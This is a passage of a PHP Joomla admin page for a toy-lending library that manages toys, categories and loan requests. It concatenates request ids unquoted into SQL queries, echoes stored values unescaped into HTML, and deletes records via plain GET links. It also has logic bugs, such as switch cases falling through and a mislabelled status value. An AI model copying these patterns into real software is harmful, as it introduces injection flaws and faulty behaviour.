						$check_cat_query
						->select('id')
						->from($db->quoteName('#__toydatabase_categorylink'))
						->where($db->quoteName('equipmentid') . ' = '. $ddid, 'AND')
						->where($db->quoteName('categoryid') . ' = "'. $row['id'] .'"');
						$db->setQuery((string) $check_cat_query);
						$db->execute();
						$row_count_check= $db->getNumRows();
						if ($row_count_check == 0) {
							//no exist, so add it
							$ins_cat_request = $db->getQuery(true);
							$ins_cat_columns = array('equipmentid','categoryid');
							$ins_cat_values = array($ddid,$row['id']);
							$ins_cat_request
							->insert($db->quoteName('#__toydatabase_categorylink'))
							->columns($db->quoteName($ins_cat_columns))
							->values(implode(',', $ins_cat_values));
							try {
								$db->setQuery((string) $ins_cat_request);
								$db->execute();
							}
							catch (RuntimeException $e) {
								JFactory::getApplication()->enqueueMessage("Error on equip_cat insert ".$e->getMessage());
								return false;
							};
						};
					};
				};
			JFactory::getApplication()->enqueueMessage("Updated toy entry");
			
		}; // end of if ddid
		}; // end of if tab toys
		break;
	case "1":
		// retrieve the specific record
		if($tab == "toys") {
		$query = $db->getQuery(true);
		$query
		->select('*')
		->from($db->quoteName('#__toydatabase_equipment'))
		->where($db->quoteName('id') . ' = '. $ddid);
		$db->setQuery((string) $query);
		$db->execute();
		$row = $db->loadAssoc();
		
		// Now retrieve the category (ies)
		$query_category = $db->getQuery(true);
		$query_category
		->select(array('a.*','b.category'))
		->from($db->quoteName('#__toydatabase_categorylink','a'))
		->join('INNER', $db->quoteName('#__toydatabase_equipment_category', 'b') . ' ON (' . $db->quoteName('a.categoryid') . ' = ' . $db->quoteName('b.id') . ')')
		->where($db->quoteName('a.equipmentid') . ' = '. $ddid);
		$db->setQuery((string) $query_category);
		$db->execute();
		$category_rows = $db->loadAssocList();
		
		// And retrieve the loan state _toydatabase_loanlink
		// If its on loan it will return a row and its status will be 1
		// when returned the status should be set to 0 or something other than 1 basically
		$query_loanlink = $db->getQuery(true);
		$query_loanlink
		->select('*')
		->from($db->quoteName('#__toydatabase_loanlink'))
		->where($db->quoteName('equipmentid') . ' = '. $ddid, 'AND')
		->where($db->quoteName('status') . ' = '. '1');
		$db->setQuery((string) $query_loanlink);
		$db->execute();
		$loanlink_rows = $db->loadAssoc();
		
		?>
		<form method=post name='update_toy'>
		<input type=hidden name='act' value='2'>
		<input type=hidden name='ddid' value='<?=$ddid?>'>
		<input type=hidden name='tab' value='toys'>
		<table width=95% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
		<tr>
			<td valign=top><B>Toy Name :</B></td>
			<td><input type=text size=30 name='in_toyname' value='<?=$row["name"]?>'></td>
		</tr>
		<tr>
			<td valign=top><B>Toy URN :</B></td>
			<td><input type=text size=30 name='in_toyurn' value='<?=$row["urn"]?>'></td>
		</tr>
		<tr>
			<td valign=top><B>Toy Image :</B></td>
			<td><input type=text size=30 id='in_toyimage' name='in_toyimage' value='<?=$row["picture"]?>'>
<!-- 		<a class="modal-button" rel="{handler: 'iframe', size: {x: 570, y: 400}}" href="index.php?option=com_media&view=images&tmpl=component&e_name=in_toyimage" title="Image">Image</a> -->
			<a href="#myImgModal" class="btn" data-toggle="modal">Click to select image</a>
			<?php
			$img_modal_params = array();
			$img_modal_params['title'] = 'Image selection';
			$img_modal_params['backdrop'] = "false";
			$img_modal_params['height'] = "400px";
			$img_modal_params['width'] = "570px";
			$img_modal_params['url'] = "index.php?option=com_media&amp;view=images&amp;tmpl=component&amp;e_name=in_toyimage&amp;fieldid=in_toyimage";
			echo JHTML::_('bootstrap.renderModal', 'myImgModal', $img_modal_params);
			?> 
			</td>
		</tr>
		<tr>
			<td valign=top><B>Toy Description :</B></td>
			<td><?php 
			echo $editor->display('in_toydescription', $row["description"], '100%', '100px', '20', '4',true);			
			?>
			</td>
		</tr>
		<tr>
			<td valign=top><B>Toy Location :</B></td>
			<td><input type=text size=30 name='in_toylocation' value='<?=$row["storagelocation"]?>'></td>
		</tr>
		<tr>
			<td valign=top><B>Toy Status :</B></td>
			<td><select name='in_toystatus'>
			<option value='3' <?php if($row["status"] == 3) {echo "selected";}; ?>>DAMAGED/NO LONGER AVAILABLE</option>
			<option value='2' <?php if($row["status"] == 2) {echo "selected";}; ?>>AWAITING CLEANING/REPAIR</option>
			<option value='1' <?php if($row["status"] == 1) {echo "selected";}; ?>>ON LOAN</option>
			<option value='0' <?php if($row["status"] == 0) {echo "selected";}; ?>>AVAILABLE</option>
			<option value='99' <?php if($row["status"] == 99) {echo "selected";}; ?>>UNKNOWN</option>
			</select></td>
		</tr>
		<tr>
			<td valign=top><B>Toy Category :</B></td>
			<td><?php 
			$query_toycategory = $db->getQuery(true);
			$query_toycategory
			->select("*")
			->from($db->quoteName('#__toydatabase_equipment_category'));
			$db->setQuery((string) $query_toycategory);
			$db->execute();
			$toycategory_rows = $db->loadAssocList();
			$toycat_maxid=0;
			foreach ($toycategory_rows as $toycategory_output) {
				echo "<input type=checkbox name='toycat_arr[]' value='".$toycategory_output["category"]."' ";
//				if ($toycategory_output["id"] == $category_rows[0]["categoryid"]) {echo "checked";};
				if (array_search($toycategory_output["id"], array_column($category_rows, 'categoryid')) !== false) {echo "checked";};
				echo ">".$toycategory_output["category"]."<BR>\n";
			};
			?>
			</td>
		</tr>
		<tr>
			<td valign=top><B>Toy Loan state :<BR>(Non-edit, go to Approve/View requests tab)</B></td>
			<td><select name='in_toyloanstate' disabled>
			<option name='0' <?php if ($loanlink_rows["status"] == "0") {echo "selected";}; ?>>AVAILABLE</option>
			<option name='2' <?php if ($loanlink_rows["status"] == "2") {echo "selected";}; ?>>AWAITING LOAN REQUEST</option>
			<option name='1' <?php if ($loanlink_rows["status"] == "1") {echo "selected";}; ?>>ON LOAN</option>
			</select>
			</td>
		</tr>
		<tr>
			<td valign=top><B>Toy Due Return Date :</B></td>
			<td><?=JHTML::_('calendar', $loanlink_rows["returnbydate"], "in_toyreturndate" , "in_toyreturndate", '%Y-%m-%d'); ?></td>
		</tr>
		<tr><td colspan=2 align=right><input type=submit value='Save changes'></td></tr>
		<tr><td colspan=2 align=right><input type=button value='Delete Toy' onclick="Javascript:if(confirm('Are you sure, this is permenantly deleting this toy?')) {self.location='<?=JURI::current()?>?option=com_toydatabase&tab=toys&act=5&ddid=<?=$ddid?>';};"></td></tr>
		</table>
		</form>
		<?php
		}; // end of if tab toys
		break;
	default:
		$query = $db->getQuery(true);
		$query
		->select('SQL_CALC_FOUND_ROWS *')
		->from($db->quoteName('#__toydatabase_equipment'))
		//->join('INNER', $db->quoteName('#__toydatabase_equipment_category', 'b') . ' ON (' . $db->quoteName('a.categoryid') . ' = ' . $db->quoteName('b.id') . ')')
		//->where($db->quoteName('status') . ' = '. $db->quote('1'))
		->order($db->quoteName('name') . ' ASC');
		
		$app = JFactory::getApplication();
		$limit = $app->getUserStateFromRequest("$option.limit", 'limit', 25, 'int');
		$limitstart = JFactory::getApplication()->input->get('limitstart', 0, 'INT');
		
		$db->setQuery($query,$limitstart, $limit);
		$row = $db->loadAssocList('id');
		if(!empty($row)){
			$db->setQuery('SELECT FOUND_ROWS();');
			$num_rows=$db->loadResult();
			jimport('joomla.html.pagination');
			$pager=new JPagination($num_rows, $limitstart, $limit);
		};
		
		?>
		
		<!-- Toy database search -->
		<form method=post onsubmit="return false">
		<input type=hidden name='act' value='3'>
		<input type=hidden name='tab' value='toys'>
		<table width=100% border=0 cellpadding=0 cellspacing=0>
		<tr align=right><td align=right>Search toy library:</td><td width=230><input type=text size=20 onkeyup = "showResult(this.value)"><div id = "livesearch"></div></td></tr>
		</table>
		</form>
		<!-- END Toy database search -->

		<!-- New toy button -->
                <form method=post onsubmit="return false">
                <input type=hidden name='act' value='4'>
                <table width=100% border=0 cellpadding=0 cellspacing=0>
                <tr align=right><td align=right><input type=button name='newtoy' id='newtoy' value='Add a new toy' onclick='self.location="<?=JURI::getInstance()->toString() ?>&tab=toys&act=4"'></td></tr>
                </table>
                </form>
		<!-- END new toy button -->
		
		<table width=85% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
		<tr><td width=30%><B>Toy name</B></td>
		<td width=30%><B>Toy category</B></td>
		<td width=30%><B>Toy Photo (small)</B></td>
		<td width=10%><B>Status</B></td></tr>
		<?php 
		if (!empty($row)) {
			// print_r($row);
			foreach ($row as $row_key=>$row_value) {
				echo "<tr onclick='self.location=\"".JURI::getInstance()->toString()."&tab=toys&act=1&ddid=$row_key\"'>";
				echo "<td>".$row_value["name"]."</td>\n";
				echo "<td>";
				// Now retrieve the category (ies)
				$query_category = $db->getQuery(true);
				$query_category
				->select(array('a.*','b.category'))
				->from($db->quoteName('#__toydatabase_categorylink','a'))
				->join('INNER', $db->quoteName('#__toydatabase_equipment_category', 'b') . ' ON (' . $db->quoteName('a.categoryid') . ' = ' . $db->quoteName('b.id') . ')')
				->where($db->quoteName('a.equipmentid') . ' = '. $row_key);
				$db->setQuery((string) $query_category);
				$db->execute();
				$category_rows = $db->loadAssocList();
				foreach ($category_rows as $cat_display) {
					echo $cat_display["category"]."<BR>\n";
				};
				echo "</td>";
				echo "<td>";
				// check the file exists to display the image
				if (is_file(JPATH_BASE."/../".$row_value["picture"])) {
					// dynamically resize image using php
					echo "<img src='".JURI::root()."/components/com_toydatabase/toydatabase_thumbnailer.php?img=".$row_value["picture"]."' alt='".$row_value["picture"]."'>";
				} else {
					echo "Sorry no image exists";
				};
				echo "</td>\n";
				echo "<td>";
				switch($row_value["status"]) {
					case "3":
						echo "Damaged/No longer available";
						break;
					case "2":
						echo "Awaiting cleaning/repair";
						break;
					case "1":
						echo "On Loan";
						break;
					case "0":
						echo "Available";
						break;
					default:
						echo "Unknown";
						break;
				};
				echo "</td>\n";
				echo "</tr>";
			};
		} else {
			// no rows or toys in database found
			echo "<tr><td colspan=4 align=center><B>Sorry - No items found</B></td></tr>\n";
		};
		?>
		</table><form name='limitdisplay'>
		<?php
			echo $pager->getListFooter();
			echo "Number of toys to display per page: ".$pager->getLimitBox()."<BR>\n";
			echo "</form>";
			// end of default: switch
			break;
}; // enc of switch selecting act
echo JHtmlTabs::panel("Toy Categories",'panel-id-2');
echo "<a href='".JURI::current()."?option=com_toydatabase'><h2>Current Toy Categories</h2></a>";

switch($cat_act) {
	case "5":
		// delete record
		if($tab == "category") {
			// delete category
			// hmm, should we delete really?
			$del_query = $db->getQuery(true);
			$del_query->delete($db->quoteName('#__toydatabase_equipment_category'));
			$del_query->where($db->quoteName('id') . ' = '. $ddid);
			$db->setQuery($del_query);
			$db->execute();
		
			JFactory::getApplication()->enqueueMessage("Toy category has been deleted");
		}; // end if tab
		break;
	case "4":
		// new category
		if($tab == "category") {
?>
		                <form method=post name='update_category'>
		                <input type=hidden name='cat_act' value='2'>
		                <input type=hidden name='ddid' value='0'>
		                <input type=hidden name='tab' value='category'>
		                <table width=95% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
		                <tr>
		                        <td valign=top><B>Category Name :</B></td>
		                        <td><input type=text size=30 name='in_categoryname' value=''></td>
		                </tr>
		                <tr><td colspan=2 align=right><input type=submit value='Save changes'></td></tr>
		                </table>
		                </form>
<?php
		}; // end if category
		break;
	case "2":
		// update record
		if($tab == "category") {
			// submit changes or new entry
			// if the ddid=0 then its a new entry, otherwise its an update to the existing ddid(rowid of the toy)
			$frm_in_category = $jinput->get('in_categoryname', '', 'RAW');
	
			if ($ddid == 0) {
				// new category
				// add the request to the database
				$ins_request = $db->getQuery(true);
				$ins_columns = array('category');
				$ins_values = array($db->quote($frm_in_category));
				$ins_request
				->insert($db->quoteName('#__toydatabase_equipment_category'))
				->columns($db->quoteName($ins_columns))
				->values(implode(',', $ins_values));
				try {
					$db->setQuery($ins_request);
					$db->execute();
				}
				catch (RuntimeException $e) {
					JFactory::getApplication()->enqueueMessage($e->getMessage());
					return false;
				};
				JFactory::getApplication()->enqueueMessage("Category (".$frm_in_category.") was saved correctly.");
				echo "<BR>\n<a href='".JURI::current()."?option=com_toydatabase&tab=category'>Return to toy categories</a><BR>\n";
			} else {
				// existing toy update
				$upd_request = $db->getQuery(true);
				$upd_fields = array(
						$db->quoteName('category') . ' = ' . $db->quote($frm_in_category)
				);
				$upd_request->update($db->quoteName('#__toydatabase_equipment_category'))->set($upd_fields)->where($db->quoteName('id') . ' = '. $ddid);
				try {
					$db->setQuery($upd_request);
					$db->execute();
				}
				catch (RuntimeException $e) {
					JFactory::getApplication()->enqueueMessage($e->getMessage());
					return false;
				};
				JFactory::getApplication()->enqueueMessage("Updated category entry");
			}; // end of if ddid
		}; // end of if tab category
		break;
	case "1":
		// retrieve the specific record
		if($tab == "category") {
			$query = $db->getQuery(true);
			$query
			->select('*')
			->from($db->quoteName('#__toydatabase_equipment_category'))
			->where($db->quoteName('id') . ' = '. $ddid);
			$db->setQuery((string) $query);
			$db->execute();
			$row = $db->loadAssoc();
?>
			<form method=post name='update_category'>
			<input type=hidden name='cat_act' value='2'>
			<input type=hidden name='ddid' value='<?=$ddid?>'>
			<input type=hidden name='tab' value='category'>
			<table width=95% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
			<tr>
			<td valign=top><B>Category Name :</B></td>
			<td><input type=text size=30 name='in_categoryname' value='<?=$row["category"]?>'></td>
			</tr>
			<tr><td colspan=2 align=right><input type=submit value='Save changes'></td></tr>
			<tr><td colspan=2 align=right><input type=button value='Delete Category' onclick="Javascript:if(confirm('Are you sure, this is permenantly deleting this category?')) {self.location='<?=JURI::current()?>?option=com_toydatabase&tab=category&cat_act=5&ddid=<?=$ddid?>';};"></td></tr>
			</table>
			</form>
<?php
		}; // end if tab category
		break;
	default:
		$query = $db->getQuery(true);
		$query
		->select('SQL_CALC_FOUND_ROWS *')
		->from($db->quoteName('#__toydatabase_equipment_category'))
		->order($db->quoteName('category') . ' ASC');
		
		$app = JFactory::getApplication();
		$category_limit = $app->getUserStateFromRequest("$option.category_limit", 'category_limit', 25, 'int');
		$category_limitstart = JFactory::getApplication()->input->get('category_limitstart', 0, 'INT');
		
		$db->setQuery($query,$limitstart, $limit);
		$row = $db->loadAssocList('id');
		if(!empty($row)){
			$db->setQuery('SELECT FOUND_ROWS();');
			$num_rows=$db->loadResult();
			jimport('joomla.html.pagination');
			$pager=new JPagination($num_rows, $category_limitstart, $category_limit);
		};
?>
		<!-- New category button -->
		<form method=post onsubmit="return false">
		<input type=hidden name='cat_act' value='4'>
		<input type=hidden name='tab' value='category'>
		<table width=100% border=0 cellpadding=0 cellspacing=0>
		<tr align=right><td align=right><input type=button name='newcategory' id='newcategory' value='Add a new category' onclick='self.location="<?=JURI::getInstance()->toString() ?>&tab=category&cat_act=4"'></td></tr>
		</table>
		</form>
		<!-- END new category button -->
		
		<table width=85% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
		<tr><td width=30%><B>Category name</B></td></tr>
		<?php
		if (!empty($row)) {
			// print_r($row);
			foreach ($row as $row_key=>$row_value) {
				echo "<tr onclick='self.location=\"".JURI::getInstance()->toString()."&tab=category&cat_act=1&ddid=$row_key\"'>";
				echo "<td>".$row_value["category"]."</td></tr>\n";
			};
		} else {
			// no rows or toys in database found
			echo "<tr><td colspan=1 align=center><B>Sorry - No categories found</B></td></tr>\n";
		};
?>
				</table><form name='limitdisplay'>
<?php
		echo "</form>";
		echo $pager->getListFooter();
		echo "Number of categories to display per page: ".$pager->getLimitBox()."<BR>\n";
		// end of default: switch
		break;
};
echo JHtmlTabs::panel("Approve/View Requests",'panel-id-3');
echo "<a href='".JURI::current()."?option=com_toydatabase'><h2>Approve/View Toy Requests</h2></a>";
?>
This is the approval panel.
<?php
// approval system, theory is:
//  toydatabase_loanlink contains the loans in the system, historical and active
//  show them all sorted by which ones are active (then into history)
//  allow a manual addition for a member (or non-member)
switch($loan_act) {
	case "4":
		// add a manual loan request
		if($tab == "loan") {
		
			?>
									<form method=post name='loanrequest' id='loanrequest'>
									<input type=hidden name='loan_act' value='2'>
									<input type=hidden name='ddid' value='0'>
									<input type=hidden name='tab' value='loan'>
									<table width=95% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
									<tr>
									<td valign=top><B>Toy id :</B></td>
									<td><input type=text size=5 name='in_equipmentid' id='in_equipmentid' value=''>&nbsp;
									<a href="<?=JURI::root()?>/administrator/components/com_toydatabase/toydatabase_poptoy.php?curr_toy=<?=$row["equipmentid"]?>" class="modal" id='toyselector' name='toyselector' rel="{handler: 'iframe', size: {x: 500, y: 400}}">Toy selector</a>
									</td>
									</tr>
									<tr>
									<td valign=top><B>Member id :</B></td>
									<td><input type=text size=5 name='in_membershipid' id='in_membershipid' value=''>&nbsp;
									<a href="<?=JURI::root()?>/administrator/components/com_toydatabase/toydatabase_popmember.php?curr_member=<?=$row["membershipid"]?>" class="modal" id='memberselector' name='memberselector' rel="{handler: 'iframe', size: {x: 500, y: 400}}">Member selector</a>
									</td>
									</tr>
									<tr>
									<td valign=top><B>Loan Requested Date :</B></td>
									<td><?=JHTML::_('calendar', date("%d-%m-%Y"), "in_loandate" , "in_loandate", '%d-%m-%Y'); ?></td>
									</tr>
									<tr>
									<td valign=top><B>Return By Date :</B></td>
									<td><?=JHTML::_('calendar', date("%d-%m-%Y"), "in_returnbydate" , "in_returnbydate", '%d-%m-%Y'); ?></td>
									</tr>
									<tr>
									<td valign=top><B>Returned Date :</B></td>
									<td><?=JHTML::_('calendar', "", "in_returndate" , "in_returndate", '%d-%m-%Y'); ?></td>
									</tr>
									<tr>
									<td valign=top><B>Status :</B></td>
									<td><select name='in_status'>
									<option value=''></option>
									<option value='1'>Approved</option>
									<option value='2'>Pending</option>
									<option value='3'>Rejected</option>
									<option value='3'>Returned</option>
									</select>
									</td>
									</tr>
									<tr><td colspan=2 align=right><input type=submit value='Create request'></td></tr>
									</table>
									</form>
						<?php
						};				
		break;
	case "2":
		// save changes to loan request
		if($tab == "loan") {
			$frm_in_equipmentid = $jinput->get('in_equipmentid', '', 'RAW');
			$frm_in_membershipid = $jinput->get('in_membershipid', '', 'RAW');
			$frm_in_requestdate = $jinput->get('in_requestdate', '', 'RAW');
			$frm_in_loandate = $jinput->get('in_loandate', '', 'RAW');
			$frm_loandate=JFactory::getDate($frm_in_loandate);
			$frm_loandate_out=JHtml::_('date', $frm_loandate, 'Y-m-d 00:00:00');
				
			$frm_in_returnbydate = $jinput->get('in_returnbydate', '', 'RAW');
			$frm_returnbydate=JFactory::getDate($frm_in_returnbydate);
			$frm_returnbydate_out=JHtml::_('date', $frm_returnbydate, 'Y-m-d 00:00:00');
				
			$frm_in_returndate = $jinput->get('in_returndate', '', 'RAW');
			if ($frm_in_returndate) {
				$frm_returndate=JFactory::getDate($frm_in_returndate);
				$frm_returndate_out=JHtml::_('date', $frm_returndate, 'Y-m-d 00:00:00');
			} else {
				$frm_returndate_out="";
			};
				
			$frm_in_status = $jinput->get('in_status', '', 'RAW');
			
			$upd_request = $db->getQuery(true);
			$upd_fields = array(
					$db->quoteName('equipmentid') . ' = ' . $db->quote($frm_in_equipmentid),
					$db->quoteName('membershipid') . ' = ' . $db->quote($frm_in_membershipid),
					$db->quoteName('loandate') . ' = ' . $db->quote($frm_loandate_out),
					$db->quoteName('returnbydate') . ' = ' . $db->quote($frm_returnbydate_out),
					$db->quoteName('returndate') . ' = ' . $db->quote($frm_returndate_out),
					$db->quoteName('status') . ' = ' . $db->quote($frm_in_status)
			);
			if ($ddid == "0") {
				// it's a new entry
				$ins_columns = array('equipmentid','membershipid', 'loandate', 'returnbydate', 'returndate', 'status');
				$ins_values = array($db->quote($frm_in_equipmentid),$db->quote($frm_in_membershipid),$db->quote($frm_loandate_out),$db->quote($frm_returnbydate_out),$db->quote($frm_returndate_out),$db->quote($frm_in_status));
				$ins_request = $db->getQuery(true);
				$ins_request
				->insert($db->quoteName('#__toydatabase_loanlink'))
				->columns($db->quoteName($ins_columns))
				->values(implode(',', $ins_values));
				try {
					$db->setQuery($ins_request);
					$db->execute();
					$newuser_id = $db->insertid();
				}
				catch (RuntimeException $e) {
					echo "Error with mysql ".$e->getMessage()."<BR><BR>\n";
					JFactory::getApplication()->enqueueMessage($e->getMessage());
					return false;
				};				
			} else {
				$upd_request->update($db->quoteName('#__toydatabase_loanlink'))->set($upd_fields)->where($db->quoteName('id') . ' = '. $ddid);
			try {
				$db->setQuery($upd_request);
				$db->execute();
			}
			catch (RuntimeException $e) {
				JFactory::getApplication()->enqueueMessage($e->getMessage());
				return false;
			};
			};
			echo "<h2>Complete</h2> - Request has been updated<BR>\n";
			// send update email to end user
			// get member type lookup
			$query_equiplookup = $db->getQuery(true);
			$query_equiplookup
			->select('*')
			->from($db->quoteName('#__toydatabase_equipment'))
			->where($db->quoteName('id') . ' = '. $frm_in_equipmentid);
			$db->setQuery((string) $query_equiplookup);
			$db->execute();
			$equip_lookup = $db->loadAssoc();
			
			$check_member_query = $db->getQuery(true);
			$check_member_query
			->select('*')
			->from($db->quoteName('#__toydatabase_membership'))
			->where($db->quoteName('joomla_userid') . ' = '. $frm_in_membershipid);
			$db->setQuery((string) $check_member_query);
			$db->execute();
			$membership_count_check= $db->getNumRows();
			$membership_row = $db->loadAssoc();
			
			$userid_mailer = JFactory::getMailer();
			$sender = array(
					$config->get( 'mailfrom' ),
					$config->get( 'fromname' )
			);
			$userid_mailer->setSender($sender);
			$userid_mailer->addRecipient($membership_row["email"]);
			$userid_mailer->setSubject($config->get('sitename').'::Toy Database - Toy request updated');
			$userid_mail="Hi,
		The administrator for the Toy Library system ".$config->get('sitename')."
		Has updated your request for the following loan:
			
		Toy request: ".$equip_lookup["name"]."
		Requested date: ".$frm_in_loandate."
		Return date: ".$frm_in_returnbydate."
		
		Your approval state: ";
		switch($frm_in_status) {
			case "4":
				$loan_status="Returned";
			case "3":
				$loan_status="Rejected";
			case "2":
				$loan_status="Pending";
				break;
			case "1":
				$loan_status="Approved";
				break;
			default:
				$loan_status="Unknown";
				break;
		};
		$userid_mail.="$loan_status
		
			
					Generated by ToyDatabase(C)2016 Andy Brown";
			$userid_mailer->setBody($userid_mail);
			$user_send = $userid_mailer->Send();
			if ( $user_send !== true ) {
				echo "Error sending email to email address (".$membership_row["email"].") Please check " . $user_send->__toString(). "<BR><BR>";
			} else {
				echo "Email has been sent to ".$membership_row["email"]." to update them on their request<BR>\n";
			};
		};
		break;
	case "1":
		// edit/view this entry
		if($tab == "loan") {
			$query = $db->getQuery(true);
			$query
			->select('*')
			->from($db->quoteName('#__toydatabase_loanlink'))
			->where($db->quoteName('id') . ' = '. $ddid);
			$db->setQuery((string) $query);
			$db->execute();
			$row = $db->loadAssoc();
				
			// get member type lookup
			$query_equiplookup = $db->getQuery(true);
			$query_equiplookup
			->select('*')
			->from($db->quoteName('#__toydatabase_equipment'))
			->where($db->quoteName('id') . ' = '. $row["equipmentid"]);
			$db->setQuery((string) $query_equiplookup);
			$db->execute();
			$equip_lookup = $db->loadAssoc();
			?>
							<form method=post name='loanrequest' id='loanrequest'>
							<input type=hidden name='loan_act' value='2'>
							<input type=hidden name='ddid' value='<?=$ddid?>'>
							<input type=hidden name='tab' value='loan'>
							<table width=95% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
							<tr>
							<td valign=top><B>Toy id :</B></td>
							<td><input type=text size=5 name='in_equipmentid' id='in_equipmentid' value='<?=$row["equipmentid"]?>'>&nbsp;
							<a href="<?=JURI::root()?>/administrator/components/com_toydatabase/toydatabase_poptoy.php?curr_toy=<?=$row["equipmentid"]?>" class="modal" id='toyselector' name='toyselector' rel="{handler: 'iframe', size: {x: 500, y: 400}}">Toy selector</a>
							</td>
							</tr>
							<tr>
							<td valign=top><B>Member id :</B></td>
							<td><input type=text size=5 name='in_membershipid' id='in_membershipid' value='<?=$row["membershipid"]?>'>&nbsp;
							<a href="<?=JURI::root()?>/administrator/components/com_toydatabase/toydatabase_popmember.php?curr_member=<?=$row["membershipid"]?>" class="modal" id='memberselector' name='memberselector' rel="{handler: 'iframe', size: {x: 500, y: 400}}">Member selector</a>
							</td>
							</tr>
							<tr>
							<td valign=top><B>Request made Date :</B></td>
							<td><input type=text size=15 disabled name='in_requestdate' value='<?=$row["requestdate"]?>'></td>
							</tr>
							<tr>
							<td valign=top><B>Loan Requested Date :</B></td>
							<td><?=JHTML::_('calendar', $row["loandate"], "in_loandate" , "in_loandate", '%d-%m-%Y'); ?></td>
							</tr>
							<tr>
							<td valign=top><B>Return By Date :</B></td>
							<td><?=JHTML::_('calendar', $row["returnbydate"], "in_returnbydate" , "in_returnbydate", '%d-%m-%Y'); ?></td>
							</tr>
							<tr>
							<td valign=top><B>Returned Date :</B></td>
							<td><?=JHTML::_('calendar', $row["returndate"], "in_returndate" , "in_returndate", '%d-%m-%Y'); ?></td>
							</tr>
							<tr>
							<td valign=top><B>Status :</B></td>
							<td><select name='in_status'>
							<option value=''></option>
							<option value='1' <?php if ($row["status"] == "1") {echo "selected";}; ?>>Approved</option>
							<option value='2' <?php if ($row["status"] == "2") {echo "selected";}; ?>>Pending</option>
							<option value='3' <?php if ($row["status"] == "3") {echo "selected";}; ?>>Rejected</option>
							<option value='3' <?php if ($row["status"] == "4") {echo "selected";}; ?>>Returned</option>
							</select>
							</td>
							</tr>
							<tr><td colspan=2 align=right><input type=submit value='Save changes'></td></tr>
							</table>
							</form>
				<?php
				};				
		break;
	default:
		// default, display current loan database entries
		$query = $db->getQuery(true);
		$query
		->select('SQL_CALC_FOUND_ROWS *')
		->from($db->quoteName('#__toydatabase_loanlink'))
		->order($db->quoteName('returnbydate') . ' DESC');
		
		$app = JFactory::getApplication();
		$limit = $app->getUserStateFromRequest("$option.limit", 'limit', 25, 'int');
		$limitstart = JFactory::getApplication()->input->get('limitstart', 0, 'INT');
		
		$db->setQuery($query,$limitstart, $limit);
		$row = $db->loadAssocList('id');
		if(!empty($row)){
			$db->setQuery('SELECT FOUND_ROWS();');
			$num_rows=$db->loadResult();
			jimport('joomla.html.pagination');
			$pager=new JPagination($num_rows, $limitstart, $limit);
		};
		?>
				<!-- New loan button -->
				<form method=post onsubmit="return false">
				<input type=hidden name='loan_act' value='4'>
				<input type=hidden name='tab' value='loan'>
				<table width=100% border=0 cellpadding=0 cellspacing=0>
				<tr align=right><td align=right><input type=button name='newloan' id='newloan' value='Add a new request manually' onclick='self.location="<?=JURI::getInstance()->toString() ?>&tab=loan&loan_act=4"'></td></tr>
				</table>
				</form>
				<!-- END new loan button -->
				
				<table width=85% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
				<tr><td width=10%><B>Loan status</B></td>
				<td width=30%><B>Member name</B></td>
				<td width=30%><B>Toy name</B></td>
				<td width=10%><B>Request loan date</B></td>
				<td width=10%><B>Return due date</B></td>
				<td width=10%><B>Returned date</B></td>
				</tr>
				<?php
				if (!empty($row)) {
					// print_r($row);
					foreach ($row as $row_key=>$row_value) {
						// convert membershipid to their name
						// convert equipmentid to the toy name
						// requestdate to human date
						// returnbydate to human date
						// returndate to human date
						
						// members are complicated. They are joomla users
						// but we also have separate additional info for them in the
						// toydatabase library
						
						$check_member_query = $db->getQuery(true);
						$check_member_query
						->select('*')
						->from($db->quoteName('#__toydatabase_membership'))
						->where($db->quoteName('joomla_userid') . ' = '. $row_value["membershipid"]);
						$db->setQuery((string) $check_member_query);
						$db->execute();
						$membership_count_check= $db->getNumRows();
						$membership_row = $db->loadAssoc();						
						if ($membership_count_check > 0) {
							$membername_val=$membership_row["name"];
						} else {
							$membername_val="ERROR - User not in toydatabase (Joomla only?)";
						};
						
						$check_toy_query = $db->getQuery(true);
						$check_toy_query
						->select('*')
						->from($db->quoteName('#__toydatabase_equipment'))
						->where($db->quoteName('id') . ' = '. $row_value["equipmentid"]);
						$db->setQuery((string) $check_toy_query);
						$db->execute();
						$toyentry_count_check= $db->getNumRows();
						$toyentry_row = $db->loadAssoc();
						if ($toyentry_count_check > 0) {
							$toyequipment_val=$toyentry_row["name"];
						} else {
							$toyequipment_val="ERROR - Toy not in database (deleted?)";
						};
						
						$entry_requestdate=JFactory::getDate($row_value["loandate"]);
						$entry_requestdate_out=JHtml::_('date', $entry_requestdate, 'd/m/Y');
						
						$entry_returnbydate=JFactory::getDate($row_value["returnbydate"]);
						$entry_returnbydate_out=JHtml::_('date', $entry_returnbydate, 'd/m/Y');
						
						if ($row_value["returndate"] == "0000-00-00 00:00:00") {
							$entry_returndate_out="(Not returned)";
						} else {
							$entry_returndate=JFactory::getDate($row_value["returndate"]);
							$entry_returndate_out=JHtml::_('date', $entry_returndate, 'd/m/Y');
						};
						
						// date diff to see if theyre overdue
						$curr_date=JFactory::getDate();
						$overdue_days=($entry_returnbydate->toUnix())-($curr_date->toUnix());
						$overdue_days_output=date("d",$overdue_days);
						if (($overdue_days_output < 0) && ($row_value["returndate"] == "0000-00-00 00:00:00")) {
							$overdue_html_text="(Overdue $overdue_days_output days)";
							$overdue_row_highlighter=1;
						} else {
							$overdue_html_text="";
							$overdue_row_highlighter=0;
						};
						switch($row_value["status"]) {
							case "4":
								$loan_status="Returned";
								$row_lighting="";
							case "3":
								$loan_status="Rejected";
								$row_lighting="blue";
							case "2":
								$loan_status="Pending";
								$row_lighting="yellow";
								break;
							case "1":
								$loan_status="Approved";
								$row_lighting="green";
								break;
							default:
								$loan_status="Unknown";
								$row_lighting="light blue";
								break;
						};
						echo "<tr style='background-color:$row_lighting' onclick='self.location=\"".JURI::getInstance()->toString()."&tab=loan&loan_act=1&ddid=$row_key\"'>";
						echo "<td>".$loan_status."</td>";
						echo "<td>".$membername_val."</td>";
						echo "<td>".$toyequipment_val."</td>";
						echo "<td>".$entry_requestdate_out."</td>";
						echo "<td ";
						if ($overdue_row_highlighter) {echo "bgcolor=red";};
						echo ">".$entry_returnbydate_out." ".$overdue_html_text." </td>";
						echo "<td>".$entry_returndate_out."</td>";
